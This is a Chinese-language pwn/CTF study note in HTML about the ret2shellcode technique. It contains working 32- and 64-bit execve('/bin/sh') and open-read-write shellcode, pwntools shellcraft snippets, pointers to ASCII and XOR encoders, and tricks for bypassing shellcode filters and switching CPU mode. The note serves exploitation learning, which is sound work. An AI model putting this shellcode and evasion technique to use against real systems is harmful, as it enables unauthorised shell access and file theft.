<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># ret2shellcode,ret2shellcode</title>
    <link rel="stylesheet" href="../../../assets/css/notes.min.css">
</head>
<body>
    <div id="header-placeholder"></div>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>ret2shellcode</h1>
<blockquote>
<p>程序中不存在 system(“/bin/sh/”)的代码段，自己恶意填入代码 shellcode 并在 <strong>可执行段执行</strong> 获取 shell</p>
<p>shellcode参考：<a href="https://shell-storm.org/shellcode/index.html">https://shell-storm.org/shellcode/index.html</a></p>
<p>一些特殊的系统调用参考：<a href="https://evian-zhang.github.io/introduction-to-linux-x86_64-syscall">https://evian-zhang.github.io/introduction-to-linux-x86_64-syscall</a></p>
</blockquote>
<h2>1.手写 shellcode</h2>
<ul>
<li>
<p>32 位：</p>
<p>execve(“/bin/sh”, NULL, NULL) (21 字节)</p>
<pre><code class="language-python">shellcode = asm(&quot;&quot;&quot;
    push 0x68732f
    push 0x6e69622f
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    push 11
    pop eax
    int 0x80
&quot;&quot;&quot;)
</code></pre>
<p>当被禁用了 system 的时候，orw (56 字节)：</p>
<pre><code class="language-python">shellcode = asm(&quot;&quot;&quot;
    /*open(./flag)*/
    push 0x1010101
    xor dword ptr [esp], 0x1016660
    push 0x6c662f2e
    mov eax,0x5
    mov ebx,esp
    xor ecx,ecx
    int 0x80
    /*read(fd,buf,0x100)*/
    mov ebx,eax
    mov ecx,esp
    mov edx,0x30
    mov eax,0x3
    int 0x80
    /*write(1,buf,0x100)*/
    mov ebx,0x1
    mov eax,0x4
    int 0x80
&quot;&quot;&quot;)
</code></pre>
</li>
<li>
<p>64 位（22 字节）</p>
<pre><code class="language-shell">; excve('/bin/sh','sh',0)
; rax: 0x3b
; rdi: '/bin/sh' 
; rsi: 'sh' 
; rdx; NULL
</code></pre>
<pre><code class="language-shell">xor 	rsi, rsi
push	rsi	
mov 	rdi, 0x68732f2f6e69622f
push	rdi
push	rsp		
pop	    rdi			
mov 	al,	59	
cdq				
syscall
</code></pre>
</li>
<li>
<p>可能会存在一些特殊情况需要我们构造更特殊的 shellcode ，这时我们就需要对汇编语言有较好的掌握，tips：<code>lea</code>, <code>xchg</code>，<code>cdq</code>,<code>pop</code>,<code>push</code></p>
</li>
</ul>
<h2>2.pwntools 生成</h2>
<p>shell（32 位 44 字节，64 位 48 字节）</p>
<pre><code class="language-python">context.arch = elf.arch
shellcode = asm(shellcraft.sh())
</code></pre>
<p>orw（32 位 55 字节，64 位 66 字节）</p>
<pre><code class="language-python">shellcode = ''
shellcode += shellcraft.open('./flag')
shellcode += shellcraft.read('eax','esp',0x100)
shellcode += shellcraft.write(1,'esp',0x100)
shellcode = asm(shellcode)
</code></pre>
<pre><code class="language-python">shellcode = ''
shellcode += shellcraft.open('./flag')
shellcode += shellcraft.read('rax','rsp',0x100)
shellcode += shellcraft.write(1,'rsp',0x100)
shellcode = asm(shellcode)
</code></pre>
<h2>3.特殊的 shellcode</h2>
<p><a href="https://github.com/rcx/shellcode_encoder">https://github.com/rcx/shellcode_encoder</a></p>
<p><a href="https://github.com/SkyLined/alpha3">https://github.com/SkyLined/alpha3</a></p>
<p>纯 ASCII 的 shellcode：alpha3 项目可以实现可见 shellcode</p>
<p>注意：alpha3 生成 shellcode 时如果设置 rax 那么跳转至 shellcode 时 rax 必须为 shellcode 的地址。设置为其他寄存器同理</p>
<p>XOR编码shellcode：利用jmp/call编码器，寻找合适的key（与原始shellcode的每个字节不同，不然编码后为\x00，相当于没有编码），满足编码后的shellcode</p>
<p>可能常用的汇编指令：</p>
<pre><code class="language-asm">1.数据传送:
push/pop eax…
pusha/popa

2.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr [eax… + 立即数], al dl…
sub byte ptr [eax… + 立即数], ah dh…
sub dword ptr [eax… + 立即数], esi edi
sub word ptr [eax… + 立即数], si di
sub al dl…, byte ptr [eax… + 立即数]
sub ah dh…, byte ptr [eax… + 立即数]
sub esi edi, dword ptr [eax… + 立即数]
sub si di, word ptr [eax… + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax… + 立即数], esi edi
and word ptr [eax… + 立即数], si di
and ah dh…, byte ptr [ecx edx… + 立即数]
and esi edi, dword ptr [eax… + 立即数]
and si di, word ptr [eax… + 立即数]

xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax… + 立即数], al dl…
cmp byte ptr [eax… + 立即数], ah dh…
cmp dword ptr [eax… + 立即数], esi edi
cmp word ptr [eax… + 立即数], si di
cmp al dl…, byte ptr [eax… + 立即数]
cmp ah dh…, byte ptr [eax… + 立即数]
cmp esi edi, dword ptr [eax… + 立即数]
cmp si di, word ptr [eax… + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

&lt;=&gt; jmp lable

6.交换al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
</code></pre>
<h2>4.tips</h2>
<p>对于一些栈布局的情况，我们可以采取使用 nop 滑行（b “\x90”）或 ret 滑行的技术，使其执行 shellcode</p>
<p>（nop 滑行优于 ret，因为 nop 只占用一字节，在随机化的情况下概率更大）</p>
<p>对于过滤 shellcode 的题目一般是采用 strlen 获取 shellcode 长度，因此可以在 shellcode 前加一个以 x00 开头的指令来绕过对 shellcode 的过滤</p>
<h2>5.切换系统架构</h2>
<p>64 位与 32 位架构的系统调用号是不同的：</p>
<ul>
<li>64 位：0 read，1 write，2 open</li>
<li>32 位：3 read，4 write，5 open</li>
</ul>
<p>CS 为代码段寄存器，IP 为指令指针寄存器，它们指示了 CPU 当前要读取指令的地址，任意时刻，8086CPU 都会将 CS: IP 指向的指令作为下一条需要取出执行的指令，cs 寄存器的 D 标志位，用以区分程序应该运行在 32 位还是 64 位架构上</p>
<p>cs 寄存器中 0x23 表示 32 位运行模式，0x33 表示 64 位运行模式（0x23:10 0011 ; 0x33:11 0011）</p>
<p>利用：retfq（retf）指令包含 ret 和 pop cs 两步，也就是先后 pop rip 和 cs，这样我们就能够切换系统架构。</p>
<p>注意：要设置好 rsp 寄存器，因为切换到 32 位时，寄存器也会被切换成 32 位，所以需要调整栈顶的指针</p>

        </main>
    </div>
    <footer class="footer">
        <p>&copy; 2024 waiwai24. All rights reserved.</p>
    </footer>
    <script src="../../../assets/js/header.js"></script>
    <script src="../../../assets/js/include-header.js"></script>
</body>
</html>